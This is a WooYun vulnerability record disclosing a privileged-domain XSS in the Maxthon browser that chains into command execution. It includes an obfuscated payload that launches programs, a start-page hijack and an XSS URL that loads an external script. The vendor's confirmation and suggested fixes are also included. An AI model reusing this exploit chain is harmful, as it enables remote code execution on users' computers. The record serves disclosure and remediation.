{"id": 72003, "wybug_id": "wooyun-2015-0140915", "wybug_title": "傲游浏览器命令执行漏洞（特权域xss）", "wybug_corp": "傲游", "wybug_author": "隐形人真忙", "wybug_date": "2015-09-13 17:22", "wybug_open_date": "2015-12-15 13:26", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端安全", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-15：\t细节向公众公开  简要描述： 傲游浏览器设计存在缺陷，存在特权域XSS，结合API可进行命令执行。 详细说明：  紧跟大牛的步伐挖洞！-------------------------------0x00 特权域XSS-------------------------------从MxWebkit.dll中发现了一些特权域：\n\n在查看mx://res/error/danger_site.htm特权域时发现有对URL的处理：\n\n访问mx://res/error/danger_site.htm?javascript:alert(document.domain)，发现支持javascript协议：\n\n-------------------------------0x01 漏洞利用-------------------------------在特权域中，用户要进行点击触发漏洞，由于新版本的浏览器限制了external中的mxCall函数的调用，所以利用本地域加载特权域，并使用点击劫持的方法进行利用受到了限制。为了增大用户中招的概率，可以利用maxthon.cn域下的XSS设置含有XSS的特权域为主页。在maxthon.cn下，都可以对maxthon对象进行调用，从而修改浏览器的一些配置，比如代理、主页、快捷键等等。设置主页的代码如下：test.js:\nurl = \"mx://res/error/danger_site.htm?javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,115,46,115,114,99,61,34,109,120,58,47,47,114,101,115,47,110,111,116,105,102,105,99,97,116,105,111,110,47,34,59,115,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,115,46,99,111,110,116,101,110,116,87,105,110,100,111,119,46,109,97,120,116,104,111,110,46,112,114,111,103,114,97,109,46,80,114,111,103,114,97,109,46,108,97,117,110,99,104,40,34,67,58,47,119,105,110,100,111,119,115,47,115,121,115,116,101,109,51,50,47,99,97,108,99,46,101,120,101,34,44,34,34,41,125,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))\";maxthon.browser.config.ConfigManager.set(\"maxthon.config\",\"browser.general.startpage\",url);\n下面缺一个XSS，神器扫：\nhttp://pay.maxthon.cn/bill99.php?gname=maxthon/\"><svg/onload=alert(1)>&g_server=maxthon\n利用XSS加载外部JS执行主页设置代码，这里的XSS比较坑爹，设置了长度限制，但是可以使用匿名函数的方法执行我们的代码，使用Function(URL)()和\\u2028执行超长JS代码：\nhttp://pay.maxthon.cn/bill99.php?gname=maxthon%22/%3E%3Csvg/onload=Function(document.URL)()%3E#【\\u2028】var s=document.createElement(\"script\");s.src=\"http://1.exploitcat.sinaapp.com/test.js\";document.body.appendChild(s);\n-------------------------------0x02 效果-------------------------------再次打开浏览器，看到带有XSS的特权域页面被设置成为主页，执行命令效果如下：\n\n   漏洞证明：  \n\n   修复方案：  1.修复maxthon.cn和特权域的XSS2.对maxthon对象的访问控制更加细粒度   版权声明：转载请注明来源 隐形人真忙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-09-16 13:25 厂商回复： 多谢反馈.  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-16 14:40 |    \t\tzhiher \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  大牛    \n     2015-09-16 15:37 |    \t\t隐形人真忙 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:14        | Hello hacker！)\t\t \n  我rank这么少   还不给高点儿    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}